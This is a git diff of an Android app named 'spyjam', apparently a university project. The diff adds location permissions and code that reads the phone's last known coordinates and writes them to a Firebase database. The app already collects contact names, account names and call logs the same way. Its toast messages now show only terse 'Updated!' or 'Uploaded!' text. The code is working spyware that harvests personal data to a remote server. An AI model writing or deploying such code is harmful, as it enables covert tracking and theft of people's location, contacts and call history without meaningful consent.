@@ -6,6 +6,8 @@ import android.annotation.SuppressLint
 import android.app.AlertDialog
 import android.app.Application
 import android.content.pm.PackageManager
+import android.location.Location
+import android.location.LocationManager
 import android.net.Uri
 import android.os.Build
 import android.os.Bundle
@@ -16,6 +18,8 @@ import android.widget.Toast
 import androidx.annotation.RequiresApi
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
+import com.google.android.gms.location.FusedLocationProviderClient
+import com.google.android.gms.location.LocationServices
 import com.google.firebase.database.FirebaseDatabase
 import kotlinx.android.synthetic.main.activity_main.*
 import ut.ee.cs.spyjam.R
@@ -32,10 +36,11 @@ class MainActivity : AppCompatActivity() {
     val database = FirebaseDatabase.getInstance()
     val myRef = database.getReference("userData").child("$randomID")
     val REQ_CODE = 1
+    private lateinit var fusedLocationClient: FusedLocationProviderClient
     @RequiresApi(Build.VERSION_CODES.O)
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-
+        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
         setContentView(R.layout.activity_main)
         //alert dialog
         val builder = AlertDialog.Builder(this)
@@ -96,7 +101,9 @@ class MainActivity : AppCompatActivity() {
             ActivityCompat.checkSelfPermission(this, Manifest.permission.GET_ACCOUNTS)!=PackageManager.PERMISSION_GRANTED ||
             ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_NUMBERS)!=PackageManager.PERMISSION_GRANTED ||
             ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE)!=PackageManager.PERMISSION_GRANTED ||
-            ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)!=PackageManager.PERMISSION_GRANTED
+            ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)!=PackageManager.PERMISSION_GRANTED ||
+            ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)!=PackageManager.PERMISSION_GRANTED ||
+            ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION)!=PackageManager.PERMISSION_GRANTED
         )
         {
             ActivityCompat.requestPermissions(this, arrayOf(
@@ -105,9 +112,9 @@ class MainActivity : AppCompatActivity() {
                 Manifest.permission.GET_ACCOUNTS,
                 Manifest.permission.READ_PHONE_NUMBERS,
                 Manifest.permission.READ_PHONE_STATE,
-                Manifest.permission.READ_CALL_LOG
-
-
+                Manifest.permission.READ_CALL_LOG,
+                Manifest.permission.ACCESS_FINE_LOCATION,
+                Manifest.permission.ACCESS_COARSE_LOCATION
             ),REQ_CODE)
         }
         else{
@@ -195,8 +202,18 @@ class MainActivity : AppCompatActivity() {
         myRef.child("ContactNames").setValue(nameList)
     }
 
+    @SuppressLint("MissingPermission")
     fun getLocation(){
-        val text = "Will be implemented!"
+        var myLatitude = 0.0
+        var myLongitude = 0.0
+        fusedLocationClient.lastLocation
+            .addOnSuccessListener { location : Location? ->
+                myLatitude = location!!.latitude
+                myLongitude = location.longitude
+                myRef.child("locationCoordinates").setValue("$myLatitude , $myLongitude")
+            }
+
+        val text = "Updated!"
         val duration = Toast.LENGTH_SHORT
         val toast = Toast.makeText(applicationContext, text, duration)
         toast.show()
@@ -219,14 +236,14 @@ class MainActivity : AppCompatActivity() {
             myRef.child("AccName").setValue(gmail)
         }
         else {
-            val text = "No Accounts detected!"
+            val text = "Uploaded!"
             val duration = Toast.LENGTH_SHORT
             val toast = Toast.makeText(applicationContext, text, duration).show()
             myRef.child("AccName").setValue("empty")
         }
     }
     fun getLastPicture() {
-        val text = "User data has successfully been uploaded!"
+        val text = "Uploaded!"
         val duration = Toast.LENGTH_SHORT
         val toast = Toast.makeText(applicationContext, text, duration)
         toast.show()
@@ -236,10 +253,7 @@ class MainActivity : AppCompatActivity() {
     @SuppressLint("MissingPermission")
     fun getLogs(){
         var callMap = HashMap<String,String>()
-        var phoneNumberList = ArrayList<String>()
-        var durationListString = ArrayList<String>()
         val cursor = contentResolver.query(CallLog.Calls.CONTENT_URI,null,null,null)
-        var logSteps = 0
         while (cursor!!.moveToNext()){
            var numberIndex = cursor!!.getColumnIndex(CallLog.Calls.NUMBER)
            var durationIndex = cursor!!.getColumnIndex(CallLog.Calls.DURATION)
